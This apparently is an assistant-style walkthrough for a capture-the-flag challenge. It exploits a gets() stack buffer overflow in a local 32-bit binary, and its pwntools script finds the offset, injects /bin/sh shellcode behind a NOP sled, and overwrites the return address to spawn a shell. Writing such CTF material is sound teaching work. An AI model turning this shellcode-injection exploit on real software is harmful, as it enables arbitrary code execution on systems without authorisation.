To solve this challenge using `pwntools`, you need to exploit the vulnerability in the `gets()` function in the `validate_passwd()` function. The `gets()` function does not check the length of the input, which allows for a **buffer overflow**. This can be used to overwrite the return address on the stack and gain control of the program's execution flow.

Here are the steps and the corresponding code to solve this challenge:

### Steps to Solve the Challenge

1. **Analyze the Binary**:
   - The binary is a 32-bit ELF file.
   - The `gets()` function in `validate_passwd()` is vulnerable to a buffer overflow.
   - The `check()` function uses `mprotect()` to make the memory writable, executable, and readable, which can be useful for shellcode injection.

2. **Find the Offset**:
   - Use a cyclic pattern to determine the offset to overwrite the return address.

3. **Craft the Payload**:
   - Inject shellcode into the buffer.
   - Overwrite the return address with the address of the buffer where the shellcode resides.

4. **Exploit the Binary**:
   - Use `pwntools` to send the payload and gain a shell.

### Code to Solve the Challenge

Here is the Python code using `pwntools`:

```python
from pwn import *

# Set up the binary
binary = './int'
elf = ELF(binary)

# Start the process
p = process(binary)

# Step 1: Find the offset
# Generate a cyclic pattern to find the offset
payload = cyclic(100)  # Generate a pattern of 100 bytes
p.sendline(payload)
p.wait()  # Wait for the process to crash

# Get the core dump to find the offset
core = p.corefile
eip = core.eip  # Get the value of EIP (return address)
offset = cyclic_find(eip)  # Find the offset in the pattern
log.info(f"Offset found: {offset}")

# Step 2: Craft the payload
# Shellcode for 32-bit Linux (execve /bin/sh)
shellcode = asm(shellcraft.sh())

# Address of the buffer (you can use GDB to find this or use a NOP sled)
buffer_address = 0xffffd000  # Replace with the actual address of the buffer

# Create the payload
payload = flat(
    asm('nop') * (offset - len(shellcode)),  # NOP sled
    shellcode,                              # Inject shellcode
    buffer_address                          # Overwrite return address
)

# Step 3: Exploit the binary
# Restart the process
p = process(binary)

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
```

### Explanation of the Code

1. **Finding the Offset**:
   - A cyclic pattern is sent to the program to cause a crash.
   - The core dump is analyzed to find the value of the instruction pointer (EIP), which tells us where the buffer overflow occurred.
   - The `cyclic_find()` function is used to determine the exact offset to overwrite the return address.

2. **Crafting the Payload**:
   - The payload consists of:
     - A NOP sled to ensure the shellcode is executed.
     - The shellcode itself (generated using `pwntools`' `shellcraft` module).
     - The address of the buffer where the shellcode resides.

3. **Exploiting the Binary**:
   - The payload is sent to the program, and the return address is overwritten with the address of the buffer containing the shellcode.
   - This gives control of the program to the attacker, allowing them to execute arbitrary code (in this case, a shell).

### Notes

- Replace `buffer_address` with the actual address of the buffer. You can find this using GDB or by analyzing the binary.
- If ASLR (Address Space Layout Randomization) is enabled, you may need to bypass it using techniques like leaking an address or using a ROP chain.
- Ensure that the binary is running in an environment where `mprotect()` allows execution of the shellcode.

---

### Tools to Use

- **GDB**: To debug the binary and find the buffer address.
- **Pwntools**: For crafting the exploit and automating the attack.
- **Checksec**: To analyze the binary's protections (e.g., ASLR, NX, PIE).
